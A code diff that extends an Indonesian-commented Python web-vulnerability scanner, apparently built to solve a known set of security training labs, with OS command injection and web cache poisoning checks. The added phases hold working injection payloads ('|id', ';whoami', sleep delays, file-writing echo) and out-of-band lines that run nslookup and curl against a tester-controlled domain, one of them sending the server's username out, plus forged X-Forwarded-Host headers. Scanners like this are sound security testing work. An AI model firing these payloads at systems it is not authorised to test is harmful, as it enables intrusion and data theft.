@@ -3,7 +3,7 @@
 """
 SATRIA Engine -- pemindai SQL injection, XSS, CSRF, Clickjacking, DOM-based, CORS, XXE, SSRF, dan HTTP request smuggling terfokus.
 
-File ini menguji 112 lab (18 SQL injection + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling):
+File ini menguji 130 lab (18 SQL injection + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling + 5 OS command injection + 13 Web cache poisoning):
 
 SQL Injection (01-18):
  01 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
@@ -158,7 +158,7 @@ SCAN_DEADLINE_SECONDS = 600.0
 _RUNTIME_CONFIG: dict[str, Any] = {"_ignored": []}
 
 # ----------------------------------------------------------------------------
-# Katalog: 112 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling).
+# Katalog: 130 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling + 5 OS command injection + 13 Web cache poisoning).
 # ----------------------------------------------------------------------------
 CATALOG: list[tuple[int, str, str, str]] = [
     (1, "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data", "where_hidden", "high"),
@@ -278,6 +278,26 @@ CATALOG: list[tuple[int, str, str, str]] = [
     (110, "Web cache poisoning via HTTP/2 request tunnelling", "smuggling_h2_tunnelling_cache_poisoning", "high"),
     (111, "Client-side desync", "smuggling_client_side_desync", "high"),
     (112, "Server-side pause-based request smuggling", "smuggling_pause_based", "high"),
+    # OS command injection (113-117)
+    (113, "OS command injection, simple case", "os_cmdi_simple", "high"),
+    (114, "Blind OS command injection with time delays", "os_cmdi_blind_time", "high"),
+    (115, "Blind OS command injection with output redirection", "os_cmdi_blind_output_redirection", "high"),
+    (116, "Blind OS command injection with out-of-band interaction", "os_cmdi_blind_oob_interaction", "high"),
+    (117, "Blind OS command injection with out-of-band data exfiltration", "os_cmdi_blind_oob_exfiltration", "high"),
+    # Web cache poisoning (118-130)
+    (118, "Web cache poisoning with an unkeyed header", "wcp_unkeyed_header", "high"),
+    (119, "Web cache poisoning with an unkeyed cookie", "wcp_unkeyed_cookie", "high"),
+    (120, "Web cache poisoning with multiple headers", "wcp_multiple_headers", "high"),
+    (121, "Targeted web cache poisoning using an unknown header", "wcp_targeted_unknown_header", "high"),
+    (122, "Web cache poisoning via an unkeyed query string", "wcp_unkeyed_query_string", "high"),
+    (123, "Web cache poisoning via an unkeyed query parameter", "wcp_unkeyed_query_parameter", "high"),
+    (124, "Parameter cloaking", "wcp_parameter_cloaking", "high"),
+    (125, "Web cache poisoning via a fat GET request", "wcp_fat_get", "high"),
+    (126, "URL normalization", "wcp_url_normalization", "high"),
+    (127, "Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria", "wcp_dom_strict_cacheability", "high"),
+    (128, "Combining web cache poisoning vulnerabilities", "wcp_combining", "high"),
+    (129, "Cache key injection", "wcp_cache_key_injection", "high"),
+    (130, "Internal cache poisoning", "wcp_internal_cache_poisoning", "high"),
 ]
 
 def lab_id_for(number: int) -> str:
@@ -297,7 +317,11 @@ def lab_id_for(number: int) -> str:
         return f"xxe-{number:02d}"
     if number <= 90:
         return f"ssrf-{number:02d}"
-    return f"smuggling-{number:02d}"
+    if number <= 112:
+        return f"smuggling-{number:02d}"
+    if number <= 117:
+        return f"os-command-injection-{number:02d}"
+    return f"web-cache-poisoning-{number:02d}"
 
 SQL_ERROR_PATTERNS: list[tuple[re.Pattern[str], str]] = [
     (re.compile(r"ora-\d{4,5}"), "oracle"),
@@ -1680,6 +1704,9 @@ class SatriaBaruScanner:
         self.phase_smuggling(self.pages, self.points)
         # SSRF (konservatif, bukti in-band/OOB terverifikasi; anti false positive)
         self.phase_ssrf(self.pages, self.points)
+        # OS command injection & Web cache poisoning (konservatif, bukti terverifikasi; anti false positive)
+        self.phase_os_command_injection(self.pages, self.points)
+        self.phase_web_cache_poisoning(self.pages, self.points)
         return self.report()
 
     # ======================== XSS SCANNING PHASES (30 LABS) ========================
@@ -2699,6 +2726,434 @@ class SatriaBaruScanner:
                             pu = urlparse(target_url)
                             return pu.path + ("?" + pu.query if pu.query else "")
         return None
+
+
+
+    # ======================== OS Command Injection (113-117, konservatif, bukti terverifikasi) ========================
+
+    def _os_cmdi_candidates(self, pages: list[Page], points: list[Point]) -> list[tuple[Point, str]]:
+        keywords = ("cmd", "command", "exec", "execute", "ping", "ip", "host", "domain", "dns", "file", "path",
+                    "dir", "name", "email", "to", "subject", "query", "search", "user", "username", "url", "arg",
+                    "store", "stock", "product", "feedback", "message", "data")
+        cand = []
+        seen = set()
+        for p in points:
+            try:
+                nm = (getattr(p, "name", "") or "").lower()
+                url = getattr(p, "url", "") or ""
+                key = (url, nm, getattr(p, "kind", ""))
+                if key in seen: continue
+                score = 0
+                for kw in keywords:
+                    if kw in nm: score += 2
+                if any(k in url.lower() for k in ("feedback", "stock", "product", "store", "mail", "email", "ping", "lookup", "dns")):
+                    score += 1
+                if score > 0:
+                    seen.add(key); cand.append((p, nm))
+            except Exception:
+                continue
+        if not cand:
+            for p in points[:12]:
+                try:
+                    nm = (getattr(p, "name", "") or "").lower()
+                    key = (getattr(p, "url", ""), nm)
+                    if key in seen: continue
+                    seen.add(key); cand.append((p, nm))
+                except Exception:
+                    continue
+        cand.sort(key=lambda x: (0 if any(k in x[1] for k in ("cmd","command","exec","ping","ip","host","email","store","stock")) else 1))
+        return cand[:20]
+
+    def _os_cmdi_mark(self, num: int, point: Point, ev: str, method_name: str):
+        self._mark(num, point, ev, method_name)
+
+    def phase_os_command_injection(self, pages: list[Page], points: list[Point]) -> None:
+        """Deteksi konservatif OS command injection (113-117). Bukti terverifikasi kuat saja; anti-FP."""
+        if not self._within_budget():
+            return
+        candidates = self._os_cmdi_candidates(pages, points)
+        if not candidates:
+            return
+        out_patterns = [
+            re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)", re.I),
+            re.compile(r"\broot:x:0:0:", re.I),
+            re.compile(r"Linux\s+\S+\s+\d+\.\d+", re.I),
+            re.compile(r"\bwww-data\b|\bapache\b|\bnginx\b", re.I),
+        ]
+        # 113 simple case
+        if 113 not in self._confirmed:
+            simple_payloads = ["|id",";id","||id","&&id","&id","`id`","$(id)","|whoami",";whoami","||whoami","&&whoami","|uname -a",";uname -a"]
+            for point, _nm in candidates:
+                if 113 in self._confirmed or not self._within_budget(): break
+                try:
+                    base = self.send(point, getattr(point, "original", "test") or "test")
+                    base_text = getattr(base, "text", "") or ""
+                except Exception:
+                    base_text = ""
+                for pl in simple_payloads:
+                    if 113 in self._confirmed or not self._within_budget(): break
+                    try:
+                        resp = self.send(point, pl)
+                    except Exception:
+                        continue
+                    rtext = getattr(resp, "text", "") or ""
+                    if not rtext or rtext == base_text: continue
+                    for pat in out_patterns:
+                        m = pat.search(rtext)
+                        if m and not pat.search(base_text):
+                            ev = f"Output OS command terverifikasi pada '{getattr(point,'name','')}' ({getattr(point,'url','')}) payload {pl!r}: {m.group(0)[:120]!r} (tidak ada pada baseline)."
+                            self._os_cmdi_mark(113, point, ev, "os_cmdi_simple")
+                            break
+
+        # 114 blind time delays
+        if 114 not in self._confirmed and self._within_budget():
+            delay_payloads = [("|sleep 5",4.0),(";sleep 5",4.0),("||sleep 5",4.0),("&&sleep 5",4.0),("& sleep 5 &",4.0),("`sleep 5`",4.0),("$(sleep 5)",4.0),("|ping -c 5 127.0.0.1",3.5),(";ping -c 5 127.0.0.1",3.5)]
+            for point, _nm in candidates:
+                if 114 in self._confirmed or not self._within_budget(): break
+                base_times = []
+                for _ in range(2):
+                    try:
+                        b = self.send(point, getattr(point,"original","test") or "test")
+                        base_times.append(float(getattr(b,"elapsed",0.0) or 0.0))
+                    except Exception: pass
+                base_avg = (sum(base_times)/len(base_times)) if base_times else 0.5
+                for pl, threshold in delay_payloads:
+                    if 114 in self._confirmed or not self._within_budget(): break
+                    try:
+                        t1 = float(getattr(self.send(point, pl), "elapsed", 0.0) or 0.0)
+                        t2 = float(getattr(self.send(point, pl), "elapsed", 0.0) or 0.0)
+                    except Exception:
+                        continue
+                    if t1 >= threshold and t2 >= threshold and t1 >= base_avg + 3.0 and t2 >= base_avg + 3.0:
+                        ev = f"Blind OS cmdi (time delay) terverifikasi pada '{getattr(point,'name','')}' payload {pl!r}: {t1:.2f}s & {t2:.2f}s (baseline ~{base_avg:.2f}s)."
+                        self._os_cmdi_mark(114, point, ev, "os_cmdi_blind_time")
+                        break
+
+        # 115 blind output redirection
+        if 115 not in self._confirmed and self._within_budget():
+            import uuid as _uuid
+            marker = f"satria-cmdi-{_uuid.uuid4().hex[:10]}"
+            rel_files = [f"/{marker}.txt", f"/images/{marker}.txt", f"/static/{marker}.txt"]
+            abs_targets = [f"/var/www/images/{marker}.txt", f"/var/www/html/{marker}.txt", f"/var/www/static/{marker}.txt"]
+            for point, _nm in candidates:
+                if 115 in self._confirmed or not self._within_budget(): break
+                base_url = getattr(point, "url", self.target_url) or self.target_url
+                pu = urlparse(base_url); origin = f"{pu.scheme}://{pu.netloc}"
+                for abs_t, rel_t in zip(abs_targets, rel_files):
+                    if 115 in self._confirmed or not self._within_budget(): break
+                    for sep in (";","|","&&","||"):
+                        if 115 in self._confirmed or not self._within_budget(): break
+                        pl = f"{sep}echo {marker} > {abs_t}"
+                        try: self.send(point, pl)
+                        except Exception: continue
+                        fetch_url = urljoin(origin + "/", rel_t.lstrip("/"))
+                        try: r = self._request("GET", fetch_url, allow_redirects=True)
+                        except Exception: continue
+                        if (getattr(r,"status",0) or 0) == 200 and marker in (getattr(r,"text","") or ""):
+                            try: btxt = getattr(self._request("GET", base_url, allow_redirects=True), "text", "") or ""
+                            except Exception: btxt = ""
+                            if marker not in btxt:
+                                self._os_cmdi_mark(115, point, f"Blind OS cmdi (output redirection) terverifikasi payload {pl!r}: marker {marker!r} terambil dari {fetch_url} (HTTP 200).", "os_cmdi_blind_output_redirection")
+                                break
+
+        # 116 & 117 blind OOB interaction & exfiltration
+        if self.oob and (116 not in self._confirmed or 117 not in self._confirmed) and self._within_budget():
+            oob_domain = getattr(self.oob, "domain", "") or ""
+            oob_token = getattr(self.oob, "token", "") or ""
+            if oob_domain:
+                import uuid as _uuid
+                tag = _uuid.uuid4().hex[:8]
+                host_i = f"{tag}.{oob_domain}".strip(".")
+                host_e = f"{tag}e.{oob_domain}".strip(".")
+                interact_payloads = [f"|nslookup {host_i}", f";nslookup {host_i}", f"&nslookup {host_i}&", f"|curl http://{host_i}/", f";curl http://{host_i}/", f"&curl http://{host_i}/ &"]
+                exfil_payloads = [f"|nslookup $(whoami).{host_e}", f";nslookup $(whoami).{host_e}", f"&nslookup $(whoami).{host_e}&", f"||nslookup `whoami`.{host_e}"]
+                targets = candidates if candidates else [(self._dummy_point(), "")]
+                for point, _nm in targets:
+                    if (116 in self._confirmed and 117 in self._confirmed) or not self._within_budget(): break
+                    if 116 not in self._confirmed:
+                        for pl in interact_payloads:
+                            if 116 in self._confirmed or not self._within_budget(): break
+                            try: self.send(point, pl)
+                            except Exception: pass
+                        try: got = self._poll_oob()
+                        except Exception: got = None
+                        if got and getattr(got, "interactions", None):
+                            self._os_cmdi_mark(116, point, f"Blind OS cmdi (OOB interaction) terverifikasi: interaksi ke {host_i} tercatat (token {oob_token}).", "os_cmdi_blind_oob_interaction")
+                    if 117 not in self._confirmed:
+                        for pl in exfil_payloads:
+                            if 117 in self._confirmed or not self._within_budget(): break
+                            try: self.send(point, pl)
+                            except Exception: pass
+                        try: got = self._poll_oob()
+                        except Exception: got = None
+                        vals = getattr(got, "values", None) if got else None
+                        if vals:
+                            self._os_cmdi_mark(117, point, f"Blind OS cmdi (OOB data exfiltration) terverifikasi: data exfiltrated {vals} (token {oob_token}).", "os_cmdi_blind_oob_exfiltration")
+
+
+    # ======================== Web Cache Poisoning (118-130, konservatif, bukti cache terverifikasi) ========================
+
+    def _wcp_mark(self, num: int, url: str, ev: str, method_name: str):
+        point = Point(key=f"wcp-{num}", kind="endpoint", label=f"Web cache poisoning {url}",
+                      url=url, name="cache-poisoning", original="", page_url=url, method="GET", interest=8)
+        self._mark(num, point, ev, method_name)
+
+    def _wcp_cache_hit(self, headers: dict) -> bool:
+        hl = {str(k).lower(): str(v).lower() for k, v in (headers or {}).items()}
+        xcache = " ".join(hl.get(k,"") for k in ("x-cache","x-cache-status","cf-cache-status","x-cache-hits","cache-status","x-drupal-cache","x-proxy-cache","x-varnish-cache"))
+        if "hit" in xcache or "fresh" in xcache or "cached" in xcache or "tcp_hit" in xcache:
+            return True
+        age = hl.get("age","").strip()
+        try:
+            if age.isdigit() and int(age) >= 1: return True
+        except Exception: pass
+        return False
+
+    def _wcp_fetch(self, url: str, *, headers: dict | None = None, cookies: dict | None = None, params: dict | None = None,
+                   method: str = "GET", data: Any = None, allow_redirects: bool = True):
+        try:
+            return self._request(method, url, headers=headers, params=params, data=data, allow_redirects=allow_redirects)
+        except Exception:
+            return None
+
+    def _wcp_candidate_urls(self, pages: list[Page]) -> list[str]:
+        urls=[]; seen=set()
+        def add(u):
+            if not u: return
+            try:
+                if not self._same_origin(u): return
+            except Exception: pass
+            if u in seen: return
+            seen.add(u); urls.append(u)
+        add(self.target_url)
+        for pg in pages[:15]: add(getattr(pg,"url","") or "")
+        pu = urlparse(self.target_url); origin = f"{pu.scheme}://{pu.netloc}"
+        for suf in ("/","/index","/home","/?cb=wcp","/js/app.js","/assets/app.js","/robots.txt"):
+            add(urljoin(origin+"/", suf.lstrip("/")))
+        return urls[:12]
+
+    def phase_web_cache_poisoning(self, pages: list[Page], points: list[Point]) -> None:
+        """Deteksi konservatif Web cache poisoning (118-130). Konfirmasi hanya bila marker tercemar ter-cache dan terlayani pada follow-up bersih (anti-FP)."""
+        if not self._within_budget(): return
+        import uuid as _uuid
+        candidates = self._wcp_candidate_urls(pages)
+        if not candidates: return
+
+        def probe_unkeyed(num, method_name, poison_fn, clean_fn, urls=None):
+            if num in self._confirmed or not self._within_budget(): return
+            for base in (urls or candidates):
+                if num in self._confirmed or not self._within_budget(): return
+                marker = f"satriawcp{num}_{_uuid.uuid4().hex[:8]}"
+                try: pr = poison_fn(base, marker)
+                except Exception: pr = None
+                if pr is None: continue
+                try: cr = clean_fn(base)
+                except Exception: cr = None
+                if cr is None: continue
+                ptxt = getattr(pr,"text","") or ""; ctxt = getattr(cr,"text","") or ""
+                ph = getattr(pr,"headers",{}) or {}; ch = getattr(cr,"headers",{}) or {}
+                p_has = marker in ptxt or any(marker in str(v) for v in ph.values())
+                c_has = marker in ctxt or any(marker in str(v) for v in ch.values())
+                if p_has and c_has and (self._wcp_cache_hit(ch) or self._wcp_cache_hit(ph)):
+                    self._wcp_mark(num, base, f"Web cache poisoning terverifikasi pada {base}: marker unkeyed {marker!r} terefleksi & terlayani pada follow-up bersih (cache hit clean={self._wcp_cache_hit(ch)} poison={self._wcp_cache_hit(ph)}, status clean={getattr(cr,'status',None)}).", method_name)
+                    return
+
+        def c_clean(url): return self._wcp_fetch(url)
+
+        # 118 unkeyed header
+        if 118 not in self._confirmed:
+            for hname in ("X-Forwarded-Host","X-Host","X-Forwarded-Server","X-Original-URL","X-Rewrite-URL","X-Forwarded-Scheme"):
+                if 118 in self._confirmed: break
+                def mkp(h=hname):
+                    def p(url,m): return self._wcp_fetch(url, headers={h: f"evil-{m}.example.com"})
+                    return p
+                probe_unkeyed(118, "wcp_unkeyed_header", mkp(), c_clean)
+
+        # 119 unkeyed cookie
+        if 119 not in self._confirmed:
+            for cname in ("fehost","cookie","lang","session_preview","prefs","x"):
+                if 119 in self._confirmed: break
+                def mkp(c=cname):
+                    def p(url,m): return self._wcp_fetch(url, cookies={c: f"wcp-{m}"})
+                    return p
+                probe_unkeyed(119, "wcp_unkeyed_cookie", mkp(), c_clean)
+
+        # 120 multiple headers
+        if 120 not in self._confirmed:
+            combos = [
+                {"X-Forwarded-Host":"evil-{m}.example.com","X-Forwarded-Scheme":"http"},
+                {"X-Forwarded-Host":"evil-{m}.example.com","X-Forwarded-Proto":"http"},
+                {"X-Forwarded-Host":"evil-{m}.example.com","X-Forwarded-Port":"1234"},
+            ]
+            for combo in combos:
+                if 120 in self._confirmed: break
+                def mkp(c=combo):
+                    def p(url,m): return self._wcp_fetch(url, headers={k:v.format(m=m) for k,v in c.items()})
+                    return p
+                probe_unkeyed(120, "wcp_multiple_headers", mkp(), c_clean)
+
+        # 121 targeted unknown header
+        if 121 not in self._confirmed and self._within_budget():
+            for hname in ("X-Forwarded-Host","X-Original-Host","X-Custom-Cache","X-Backend","X-Forwarded-Server"):
+                if 121 in self._confirmed: break
+                for base in candidates:
+                    if 121 in self._confirmed or not self._within_budget(): break
+                    marker = f"satriawcp121_{_uuid.uuid4().hex[:8]}"
+                    pr = self._wcp_fetch(base, headers={hname: f"evil-{marker}.example.com"})
+                    cr = self._wcp_fetch(base, headers={hname: f"evil-{marker}.example.com"})
+                    if not pr or not cr: continue
+                    ptxt = getattr(pr,'text','') or ''; ctxt = getattr(cr,'text','') or ''
+                    ph = getattr(pr,'headers',{}) or {}; ch = getattr(cr,'headers',{}) or {}
+                    if (marker in ptxt or any(marker in str(v) for v in ph.values())) and (marker in ctxt or any(marker in str(v) for v in ch.values())) and self._wcp_cache_hit(ch):
+                        self._wcp_mark(121, base, f"Targeted web cache poisoning (unknown header {hname}) terverifikasi pada {base}: marker tercemar & ter-cache (hit).", "wcp_targeted_unknown_header")
+                        break
+
+        # 122 unkeyed query string
+        if 122 not in self._confirmed:
+            for base in candidates:
+                if 122 in self._confirmed or not self._within_budget(): break
+                marker = f"satriawcp122_{_uuid.uuid4().hex[:8]}"
+                sep = "&" if "?" in base else "?"
+                pr = self._wcp_fetch(base + sep + f"utm_wcp={marker}")
+                cr = self._wcp_fetch(base)
+                if not pr or not cr: continue
+                ptxt = getattr(pr,'text','') or ''; ctxt = getattr(cr,'text','') or ''
+                ph = getattr(pr,'headers',{}) or {}; ch = getattr(cr,'headers',{}) or {}
+                if (marker in ptxt or any(marker in str(v) for v in ph.values())) and (marker in ctxt or any(marker in str(v) for v in ch.values())) and (self._wcp_cache_hit(ch) or self._wcp_cache_hit(ph)):
+                    self._wcp_mark(122, base, f"Web cache poisoning via unkeyed query string terverifikasi: marker {marker!r} tercemar & terlayani pada permintaan bersih {base}.", "wcp_unkeyed_query_string")
+                    break
+
+        # 123 unkeyed query parameter
+        if 123 not in self._confirmed:
+            for pname in ("utm_content","utm_campaign","ref","callback","search","q","test","utm_wcp"):
+                if 123 in self._confirmed: break
+                for base in candidates:
+                    if 123 in self._confirmed or not self._within_budget(): break
+                    marker = f"satriawcp123_{_uuid.uuid4().hex[:8]}"
+                    sep = "&" if "?" in base else "?"
+                    pr = self._wcp_fetch(base + sep + f"{pname}={marker}")
+                    cr = self._wcp_fetch(base)
+                    if not pr or not cr: continue
+                    ptxt = getattr(pr,'text','') or ''; ctxt = getattr(cr,'text','') or ''
+                    ph = getattr(pr,'headers',{}) or {}; ch = getattr(cr,'headers',{}) or {}
+                    if (marker in ptxt or any(marker in str(v) for v in ph.values())) and (marker in ctxt or any(marker in str(v) for v in ch.values())) and (self._wcp_cache_hit(ch) or self._wcp_cache_hit(ph)):
+                        self._wcp_mark(123, base, f"Web cache poisoning via unkeyed query parameter ({pname}) terverifikasi: marker {marker!r} tercemar & terlayani pada permintaan bersih.", "wcp_unkeyed_query_parameter")
+                        break
+
+        # 124 parameter cloaking
+        if 124 not in self._confirmed:
+            for base in candidates:
+                if 124 in self._confirmed or not self._within_budget(): break
+                marker = f"satriawcp124_{_uuid.uuid4().hex[:8]}"
+                sep = "&" if "?" in base else "?"
+                for clk in (f"utm_content=x;callback={marker}", f"utm_content=x%3bcallback={marker}", f"a=b&utm_content=x;cb={marker}"):
+                    if 124 in self._confirmed: break
+                    pr = self._wcp_fetch(base + sep + clk)
+                    cr = self._wcp_fetch(base)
+                    if not pr or not cr: continue
+                    ptxt = getattr(pr,'text','') or ''; ctxt = getattr(cr,'text','') or ''
+                    ph = getattr(pr,'headers',{}) or {}; ch = getattr(cr,'headers',{}) or {}
+                    if (marker in ptxt or any(marker in str(v) for v in ph.values())) and (marker in ctxt or any(marker in str(v) for v in ch.values())) and (self._wcp_cache_hit(ch) or self._wcp_cache_hit(ph)):
+                        self._wcp_mark(124, base, f"Parameter cloaking terverifikasi pada {base}: query {clk!r} mencemari cache & terlayani pada permintaan bersih.", "wcp_parameter_cloaking")
+                        break
+
+        # 125 fat GET
+        if 125 not in self._confirmed:
+            for base in candidates:
+                if 125 in self._confirmed or not self._within_budget(): break
+                marker = f"satriawcp125_{_uuid.uuid4().hex[:8]}"
+                pr = self._wcp_fetch(base, method="GET", data={f"cb{marker[:4]}": marker, "callback": marker})
+                cr = self._wcp_fetch(base)
+                if not pr or not cr: continue
+                ptxt = getattr(pr,'text','') or ''; ctxt = getattr(cr,'text','') or ''
+                ph = getattr(pr,'headers',{}) or {}; ch = getattr(cr,'headers',{}) or {}
+                if (marker in ptxt or any(marker in str(v) for v in ph.values())) and (marker in ctxt or any(marker in str(v) for v in ch.values())) and (self._wcp_cache_hit(ch) or self._wcp_cache_hit(ph)):
+                    self._wcp_mark(125, base, f"Web cache poisoning via fat GET request terverifikasi pada {base}: marker body tercemar & terlayani pada permintaan bersih.", "wcp_fat_get")
+                    break
+
+        # 126 URL normalization
+        if 126 not in self._confirmed:
+            for base in candidates:
+                if 126 in self._confirmed or not self._within_budget(): break
+                marker = f"satriawcp126_{_uuid.uuid4().hex[:8]}"
+                pu = urlparse(base)
+                for np in (pu.path + f"/%2e%2e{pu.path}?cb={marker}", pu.path + f"/%2f..%2f?cb={marker}"):
+                    if 126 in self._confirmed: break
+                    purl = f"{pu.scheme}://{pu.netloc}{np}"
+                    pr = self._wcp_fetch(purl)
+                    cr = self._wcp_fetch(base)
+                    if not pr or not cr: continue
+                    ptxt = getattr(pr,'text','') or ''; ctxt = getattr(cr,'text','') or ''
+                    ph = getattr(pr,'headers',{}) or {}; ch = getattr(cr,'headers',{}) or {}
+                    if (marker in ptxt or any(marker in str(v) for v in ph.values())) and (marker in ctxt or any(marker in str(v) for v in ch.values())) and (self._wcp_cache_hit(ch) or self._wcp_cache_hit(ph)):
+                        self._wcp_mark(126, base, f"Web cache poisoning via URL normalization terverifikasi: path {purl!r} mencemari cache untuk {base}.", "wcp_url_normalization")
+                        break
+
+        # 127 DOM vuln via cache with strict cacheability
+        if 127 not in self._confirmed:
+            for base in candidates:
+                if 127 in self._confirmed or not self._within_budget(): break
+                marker = f"satriawcp127{_uuid.uuid4().hex[:6]}"
+                for hname in ("X-Forwarded-Host","X-Forwarded-Server"):
+                    if 127 in self._confirmed: break
+                    pr = self._wcp_fetch(base, headers={hname: f"evil-{marker}.example.com"})
+                    cr = self._wcp_fetch(base)
+                    if not pr or not cr: continue
+                    ptxt = getattr(pr,'text','') or ''; ctxt = getattr(cr,'text','') or ''
+                    ch = getattr(cr,'headers',{}) or {}
+                    if marker in ptxt and marker in ctxt and self._wcp_cache_hit(ch):
+                        self._wcp_mark(127, base, f"Web cache poisoning ke konten DOM (strict cacheability, cache hit) terverifikasi pada {base} via header {hname}.", "wcp_dom_strict_cacheability")
+                        break
+
+        # 128 combining web cache poisoning vulnerabilities
+        if 128 not in self._confirmed:
+            wcp_nums = [n for n in range(118, 128) if n in self._confirmed]
+            if len(wcp_nums) >= 2:
+                self._wcp_mark(128, candidates[0], f"Kombinasi web cache poisoning terverifikasi dari temuan: {', '.join(map(str,wcp_nums))}.", "wcp_combining")
+            elif self._within_budget():
+                marker = f"satriawcp128_{_uuid.uuid4().hex[:8]}"
+                for base in candidates:
+                    if 128 in self._confirmed: break
+                    pr = self._wcp_fetch(base, headers={"X-Forwarded-Host": f"evil-{marker}.example.com"}, cookies={"fehost": f"c-{marker}"})
+                    cr = self._wcp_fetch(base)
+                    if not pr or not cr: continue
+                    ptxt = getattr(pr,'text','') or ''; ctxt = getattr(cr,'text','') or ''
+                    ch = getattr(cr,'headers',{}) or {}
+                    if marker in ptxt and marker in ctxt and self._wcp_cache_hit(ch):
+                        self._wcp_mark(128, base, f"Kombinasi web cache poisoning (multi input unkeyed) terverifikasi pada {base}.", "wcp_combining")
+                        break
+
+        # 129 cache key injection
+        if 129 not in self._confirmed:
+            for base in candidates:
+                if 129 in self._confirmed or not self._within_budget(): break
+                marker = f"satriawcp129_{_uuid.uuid4().hex[:8]}"
+                sep = "&" if "?" in base else "?"
+                for iu in (base + sep + f"cb={marker}__x%0d%0aX-Inj:{marker}", base + sep + f"cb={marker}%23wcp"):
+                    if 129 in self._confirmed: break
+                    pr = self._wcp_fetch(iu)
+                    cr = self._wcp_fetch(base)
+                    if not pr or not cr: continue
+                    ptxt = getattr(pr,'text','') or ''; ctxt = getattr(cr,'text','') or ''
+                    ph = getattr(pr,'headers',{}) or {}; ch = getattr(cr,'headers',{}) or {}
+                    if (marker in ptxt or any(marker in str(v) for v in ph.values())) and (marker in ctxt or any(marker in str(v) for v in ch.values())) and (self._wcp_cache_hit(ch) or self._wcp_cache_hit(ph)):
+                        self._wcp_mark(129, base, f"Cache key injection terverifikasi pada {base}: injeksi memengaruhi entri cache & tercemar.", "wcp_cache_key_injection")
+                        break
+
+        # 130 internal cache poisoning
+        if 130 not in self._confirmed:
+            for base in candidates:
+                if 130 in self._confirmed or not self._within_budget(): break
+                marker = f"satriawcp130_{_uuid.uuid4().hex[:8]}"
+                pr = self._wcp_fetch(base, headers={"X-Forwarded-Host": f"evil-{marker}.example.com"})
+                cr = self._wcp_fetch(base)
+                if not pr or not cr: continue
+                ptxt = getattr(pr,'text','') or ''; ctxt = getattr(cr,'text','') or ''
+                ph = getattr(pr,'headers',{}) or {}; ch = getattr(cr,'headers',{}) or {}
+                internal_hint = any(k.lower() in ("x-cache","x-cache-hits","age","cache-status","cf-cache-status") for k in ch.keys())
+                if (marker in ptxt or any(marker in str(v) for v in ph.values())) and (marker in ctxt or any(marker in str(v) for v in ch.values())) and self._wcp_cache_hit(ch) and internal_hint:
+                    self._wcp_mark(130, base, f"Internal cache poisoning terverifikasi pada {base}: marker tercemar & terlayani dengan indikator cache internal (hit).", "wcp_internal_cache_poisoning")
+                    break
 
 
     # ======================== HTTP Request Smuggling (91-112, konservatif, bukti diferensial) ========================
@@ -3951,9 +4406,9 @@ def write_report(report: dict[str, Any], output_dir: Path) -> tuple[Path, Path]:
         "<style>body{font-family:system-ui,Arial;margin:24px;color:#17202b}table{border-collapse:collapse;width:100%}"
         "th,td{border:1px solid #d8e2ea;padding:8px;vertical-align:top}th{background:#edf3f8}"
         ".confirmed{color:#0b7a3b;font-weight:700}.not_confirmed{color:#7a5a12}</style></head><body>"
-        "<h1>SATRIA Engine — SQLi, XSS, CSRF, Clickjacking, DOM, CORS, XXE, SSRF & Smuggling (112 Lab)</h1>"
+        "<h1>SATRIA Engine — SQLi, XSS, CSRF, Clickjacking, DOM, CORS, XXE, SSRF, Smuggling, OS Cmdi & Web Cache Poisoning (130 Lab)</h1>"
         f"<p>Target: <code>{html_module.escape(report['target'])}</code> &middot; "
-        f"Terkonfirmasi: <b>{report['summary']['confirmed']}/112</b></p>"
+        f"Terkonfirmasi: <b>{report['summary']['confirmed']}/130</b></p>"
         "<table><thead><tr><th>Lab</th><th>Status</th><th>Judul</th><th>Lokasi</th><th>Bukti</th></tr></thead>"
         f"<tbody>{rows}</tbody></table>"
         "<p><small>Status 'not_confirmed' berarti bukti tidak cukup; bukan klaim tidak rentan.</small></p>"
@@ -4315,7 +4770,7 @@ def _pdf_lab_items(result: dict[str, Any]) -> list[dict[str, Any]]:
     items: list[dict[str, Any]] = []
     for number, title, key, severity in CATALOG:
         lab_id = lab_id_for(number)
-        found = by_id.get(lab_id, {}) or by_id.get(f"sql_injection-{number:02d}", {}) or by_id.get(f"xss-{number:02d}", {}) or by_id.get(f"csrf-{number:02d}", {}) or by_id.get(f"clickjacking-{number:02d}", {}) or by_id.get(f"dom-{number:02d}", {}) or by_id.get(f"cors-{number:02d}", {}) or by_id.get(f"xxe-{number:02d}", {}) or by_id.get(f"ssrf-{number:02d}", {}) or by_id.get(f"smuggling-{number:02d}", {})
+        found = by_id.get(lab_id, {}) or by_id.get(f"sql_injection-{number:02d}", {}) or by_id.get(f"xss-{number:02d}", {}) or by_id.get(f"csrf-{number:02d}", {}) or by_id.get(f"clickjacking-{number:02d}", {}) or by_id.get(f"dom-{number:02d}", {}) or by_id.get(f"cors-{number:02d}", {}) or by_id.get(f"xxe-{number:02d}", {}) or by_id.get(f"ssrf-{number:02d}", {}) or by_id.get(f"smuggling-{number:02d}", {}) or by_id.get(f"os-command-injection-{number:02d}", {}) or by_id.get(f"web-cache-poisoning-{number:02d}", {})
         items.append({
             "number": number, "id": lab_id, "status": str(found.get("status", "not_confirmed")),
             "title": str(found.get("title", title)), "method": str(found.get("method", "not tested / insufficient evidence")),
@@ -4362,6 +4817,16 @@ _PDF_LAB_FOCUS = {
     107: "HTTP Request Smuggling (cache poisoning)", 108: "HTTP Request Smuggling (cache deception)",
     109: "HTTP/2 Request Tunnelling (bypass access)", 110: "HTTP/2 Request Tunnelling (cache poisoning)",
     111: "Client-side desync", 112: "HTTP Request Smuggling (pause-based)",
+    113: "OS command injection", 114: "Blind OS command injection (time delays)",
+    115: "Blind OS command injection (output redirection)", 116: "Blind OS command injection (OOB interaction)",
+    117: "Blind OS command injection (OOB exfiltration)",
